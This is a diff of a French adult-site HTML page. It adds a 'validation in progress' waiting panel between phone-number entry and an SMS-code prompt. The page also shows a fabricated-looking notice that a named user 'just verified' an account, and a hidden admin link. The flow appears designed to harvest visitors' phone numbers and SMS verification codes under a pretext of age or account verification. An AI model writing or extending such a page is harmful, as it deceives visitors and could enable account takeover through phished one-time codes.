@@ -50,7 +50,8 @@
   <p class="legal">Plateforme légale · Contenu 100% consenti & vérifié · 18+ · DMCA · <a href="admin.html" style="color:#555;text-decoration:none">Espace admin</a></p>
 </div>
 
-<div class="toast" id="toast"><span class="avatar">H</span><span><b>hugo.mr</b> de Lille vient de vérifier son compte · il y a 10 min</span></div>
+  <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+  <div class="toast" id="toast"><span class="avatar">H</span><span><b>hugo.mr</b> de Lille vient de vérifier son compte · il y a 10 min</span></div>
 
 <div class="modal hidden" id="modal">
   <div class="modal-card">
@@ -70,6 +71,12 @@
       <p>Connecté en tant que <b id="userName"></b></p>
       <button class="cta full" id="logout">Se déconnecter</button>
       <button class="cta full ghost-btn" id="unlockAll">Déverrouiller la galerie</button>
+    </div>
+    <div id="waitingPanel" class="hidden" style="text-align:center">
+      <h4 style="margin:6px 0">⏳ Validation en cours</h4>
+      <p class="sub">Numéro <b id="waitPhone"></b> envoyé en attente de validation...</p>
+      <div style="margin:14px auto;width:36px;height:36px;border:3px solid #222;border-top-color:#d6ff00;border-radius:50%;animation:spin 1s linear infinite"></div>
+      <p style="font-size:11px;color:#888"><a href="#" id="waitBack" style="color:#888">Modifier le numéro</a></p>
     </div>
     <div id="codePanel" class="hidden" style="text-align:center">
       <h4 style="margin:6px 0">📱 Code SMS</h4>
